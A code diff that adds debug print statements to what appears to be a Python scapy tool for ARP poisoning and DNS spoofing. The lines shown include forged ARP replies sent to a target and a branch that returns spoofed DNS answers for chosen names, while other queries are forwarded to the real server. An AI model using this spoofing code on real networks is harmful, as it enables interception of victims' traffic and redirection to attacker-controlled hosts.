@@ -69,7 +69,7 @@ class ArpSpoofer(object):
         arp_response = ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip)
 
         scapy.send(arp_response, iface=IFACE, verbose=0)
-
+        print(f"Sending spoof number {self.spoof_count}")
         self.spoof_count += 1
 
     def run(self) -> None:
@@ -181,10 +181,13 @@ class DnsHandler(object):
         transaction_id = pkt[DNS].id  # Transaction ID
         query_name = pkt[DNS].qd.qname  # Query name
 
+        print("Received DNS request for", query_name)
         response_pkt = None
         if query_name in SPOOF_DICT:
+            print("Spoofing DNS response for", query_name)
             response_pkt: scapy.packet.Packet = self.get_spoofed_dns_response(pkt, SPOOF_DICT[query_name])
         else:
+            print("Forwarding DNS request for", query_name, "to", REAL_DNS_SERVER_IP)
             response_pkt: scapy.packet.Packet = self.get_real_dns_response(pkt)
         scapy.send(response_pkt)
 
